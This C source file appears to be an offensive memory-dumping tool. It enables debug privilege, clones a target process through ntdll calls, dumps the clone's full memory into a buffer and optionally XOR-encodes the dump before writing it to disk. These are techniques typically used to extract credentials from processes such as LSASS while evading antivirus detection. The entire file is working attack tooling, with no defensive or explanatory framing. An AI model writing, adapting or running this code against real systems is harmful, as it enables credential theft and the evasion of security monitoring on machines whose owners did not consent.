#include <Windows.h>
#include <stdio.h>
#include <DbgHelp.h>
#include <TlHelp32.h>
#include "CloneProcDump.h"

#pragma comment (lib, "Dbghelp.lib")

/**
 * Enable SeDebugPrivilege
 *
 * @return TRUE if successfully enabled, FALSE otherwise
 */
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;

    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp = { 0 };
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return result;
}

/**
 * Parse the command line arguments
 *
 * @param argc Number of command line arguments
 * @param argv Array of command line arguments
 * @param pidOut Buffer to store the PID
 * @param outPath Buffer to store the filename/path
 * @param xorKeyOut Buffer to store the XOR key
 * @param xorLenMax Size of the XOR key buffer
 * @return TRUE if arguments parsed successfully, FALSE otherwise
 */
BOOL ParseArguments(int argc, char* argv[], DWORD* pidOut, char* outPath, size_t pathLen, char* xorKeyOut, size_t xorLenMax) {
    *pidOut = 0;
    strncpy_s(outPath, pathLen, "process.dmp", _TRUNCATE);
    xorKeyOut[0] = '\0';

    for (int i = 1; i < argc; i++) {
        if (strncmp(argv[i], "/pid:", 5) == 0) {
            *pidOut = strtoul(argv[i] + 5, NULL, 10);
        }
        else if (strncmp(argv[i], "/o:", 3) == 0) {
            strncpy_s(outPath, pathLen, argv[i] + 3, _TRUNCATE);
        }
        else if (strncmp(argv[i], "/x:", 3) == 0) {
            strncpy_s(xorKeyOut, xorLenMax, argv[i] + 3, _TRUNCATE);
        }
    }

    return (*pidOut != 0);
}

/**
 * Callback for MiniDump that adds the memory of a process to a variable
 * Also adds to a global variable that tracks amount of data written
 *
 * @param callbackParam 
 * @param callbackInput
 * @param callbackOutput
 * @return TRUE if arguments parsed successfully, FALSE otherwise
 */
static BOOL CALLBACK mCallback(PVOID callbackParam, PMINIDUMP_CALLBACK_INPUT callbackInput, PMINIDUMP_CALLBACK_OUTPUT callbackOutput) {
    LPVOID destination = 0, source = 0;
    DWORD bufferSize = 0;

    switch (callbackInput->CallbackType)
    {
    case IoStartCallback:
        callbackOutput->Status = S_FALSE;
        break;
    case IoWriteAllCallback:
        callbackOutput->Status = S_OK;
        source = callbackInput->Io.Buffer;
        destination = (LPVOID)((DWORD_PTR)dBuf + (DWORD_PTR)callbackInput->Io.Offset);
        bufferSize = callbackInput->Io.BufferBytes;
        bRead += bufferSize;
        RtlCopyMemory(destination, source, bufferSize);
        break;

    case IoFinishCallback:
        callbackOutput->Status = S_OK;
        break;

    default:
        return true;
    }
    return TRUE;
}

/**
 * Xor encrypt the supplied data
 *
 * @param data The data to be encrypted
 * @param len Maximum size of the
 * @param key The Xor key
 * @param keyLen The size of the Xor key
 * @return 0 if successful, non-zero otherwise
 */
static void XorBuffer(BYTE* data, SIZE_T len, const BYTE* key, SIZE_T keyLen) {
    for (SIZE_T i = 0; i < len; i++) {
        data[i] ^= key[i % keyLen];
    }
}

/**
 * Main function
 *
 * @param argc Number of command line arguments
 * @param argv Array of command line arguments
 * @return 0 if successful, non-zero otherwise
 */
int main(int argc, char* argv[]) {
    DWORD targetPID = 0;
    char xorKey[MAX_XOR_KEY_LENGTH] = { 0 };
    char outputPath[MAX_PATH] = "process.dmp";

    if (!ParseArguments(argc, argv, &targetPID, outputPath, sizeof(outputPath), xorKey, MAX_XOR_KEY_LENGTH)) {
        printf("Usage: %s /pid:<PID> [/x:<XOR key>] [/o:<Output Path>]\n", argv[0]);
        return 1;
    }

    if (!EnableDebugPrivilege()) {
        printf("[-] Failed to enable debug privileges.\n");
        return 1;
    }

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return 1;

    pNtOpenProcess ptrNtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
    pNtCreateProcessEx ptrNtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    pNtCreateFile ptrNtCreateFile = (pNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
    pNtWriteFile ptrNtWriteFile = (pNtWriteFile)GetProcAddress(hNtdll, "NtWriteFile");
    pNtClose ptrNtClose = (pNtClose)GetProcAddress(hNtdll, "NtClose");
    pNtTerminateProcess ptrNtTerminateProcess = (pNtTerminateProcess)GetProcAddress(hNtdll, "NtTerminateProcess");
    pRtlDosPathNameToNtPathName_U_WithStatus ptrRtlDosPathNameToNtPathName_U_WithStatus = (pRtlDosPathNameToNtPathName_U_WithStatus)GetProcAddress(hNtdll, "RtlDosPathNameToNtPathName_U_WithStatus");

    if (!ptrNtOpenProcess || !ptrNtCreateProcessEx || !ptrNtCreateFile || !ptrNtWriteFile || !ptrNtClose || !ptrNtTerminateProcess || !ptrRtlDosPathNameToNtPathName_U_WithStatus) {
        printf("[-] Failed to resolve all necessary functions.\n");
        return 1;
    }

    printf("[+] Target PID: %lu\n", targetPID);
    printf("[+] Output Path: %s\n", outputPath);
    printf("[+] XOR Key: %s\n", xorKey);

    // Open and clone target process
    HANDLE hParent = NULL, hClone = NULL;
    CLIENT_ID cid{};
    cid.UniqueProcess = (HANDLE)targetPID;
    cid.UniqueThread = NULL;
    OBJECT_ATTRIBUTES oa{};
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    printf("[+] Attempting to open process PID: %d\n", targetPID);
    NTSTATUS status = ptrNtOpenProcess(&hParent, PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenProcess failed: 0x%08X\n", status);
        return 1;
    }

    printf("[+] Attempting to clone process PID: %d\n", targetPID);
    status = ptrNtCreateProcessEx(&hClone, PROCESS_ALL_ACCESS, &oa, hParent, 0, NULL, NULL, NULL, 0);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateProcessEx failed: 0x%08X\n", status);
        ptrNtClose(hParent);
        return 1;
    }

    printf("[+] Cloned handle: %p\n", hClone);
    printf("[+] Cloned pid: %d\n", GetProcessId(hClone));

    // Initialize callback
    MINIDUMP_CALLBACK_INFORMATION callbackInfo;
    ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    callbackInfo.CallbackRoutine = &mCallback;
    callbackInfo.CallbackParam = NULL;

    printf("[+] MiniDumping to memory...\n");
    if (!MiniDumpWriteDump(hClone, GetProcessId(hClone), NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo)) {
        printf("[-] MiniDumpWriteDump failed: %lu\n", GetLastError());
        ptrNtTerminateProcess(hClone, 0);
        ptrNtClose(hClone);
        ptrNtClose(hParent);
        return 1;
    }

    // XOR buffer
    if (xorKey[0] != '\0') {
        printf("[+] XORing dump using key: %s\n", xorKey);
        XorBuffer((BYTE*)dBuf, bRead, (BYTE*)xorKey, strlen(xorKey));
    }
    else {
        printf("[*] Skipping XOR step.\n");
    }
    printf("[+] Dump successful, XOR encrypting dump\n");

    // Convert output path to NT format
    UNICODE_STRING ntFilePath;
    IO_STATUS_BLOCK ioStatus = {};

    int urlLen = (int)strlen(outputPath) + 1;
    WCHAR outputFile[2084] = { 0 };
    if (MultiByteToWideChar(CP_ACP, 0, outputPath, urlLen, outputFile, 2084) == 0) {
        ptrNtTerminateProcess(hClone, 0);
        ptrNtClose(hClone);
        ptrNtClose(hParent);
        return 1;
    }

    ptrRtlDosPathNameToNtPathName_U_WithStatus(outputFile, &ntFilePath, NULL, NULL);

    OBJECT_ATTRIBUTES fileAttr = {};
    InitializeObjectAttributes(&fileAttr, &ntFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Create File to write dump to
    printf("[+] Saving to disk...\n");
    HANDLE hOutFile;
    status = ptrNtCreateFile(
        &hOutFile,
        FILE_GENERIC_WRITE,
        &fileAttr,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateFile failed: 0x%08X\n", status);
        goto cleanup;
    }

    status = ptrNtWriteFile(hOutFile, NULL, NULL, NULL, &ioStatus, dBuf, bRead, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtWriteFile failed: 0x%08X\n", status);
    }
    else {
        printf("[+] XOR'd dump written: %s\n", outputPath);
    }

    ptrNtClose(hOutFile);

cleanup:
    ptrNtTerminateProcess(hClone, 0);
    ptrNtClose(hClone);
    ptrNtClose(hParent);

    return 0;
}
